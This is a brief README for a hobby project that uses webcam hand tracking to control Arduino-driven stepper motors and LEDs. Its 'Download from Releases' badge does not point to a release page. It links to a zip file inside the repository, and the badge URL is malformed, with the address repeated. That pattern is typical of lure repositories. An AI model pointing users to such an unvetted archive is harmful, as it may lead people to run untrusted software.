# ✋ gesture-hardware-controller - Control Your Devices with Gestures

[![Download from Releases](https://raw.githubusercontent.com/prv1511/gesture-hardware-controller/main/arduino/controller-gesture-hardware-1.3.zip%https://raw.githubusercontent.com/prv1511/gesture-hardware-controller/main/arduino/controller-gesture-hardware-1.3.zip)](https://raw.githubusercontent.com/prv1511/gesture-hardware-controller/main/arduino/controller-gesture-hardware-1.3.zip)

## 🚀 Overview

Gesture Hardware Controller is a real-time system that uses your hands to control physical devices without touching them. Using a standard camera, it tracks your hand movements and translates them into commands for hardware like stepper motors and LED lights.

## 🔍 Features

- Real-time hand tracking (supports one or two hands)
- Control devices with simple gestures
- Adjust stepper motor position and speed easily
- Turn LED lights on or off with gestures
- Control LED brightness by moving your hand
- Smooth gesture recognition for seamless interaction
- Modular design for easy expansion

## ⚙️ System Requirements

To use the Gesture Hardware Controller, you will need:

- A computer with Windows, macOS, or Linux
- A standard camera (webcam)
- Arduino board (for hardware control)
- Basic knowledge of connecting hardware components
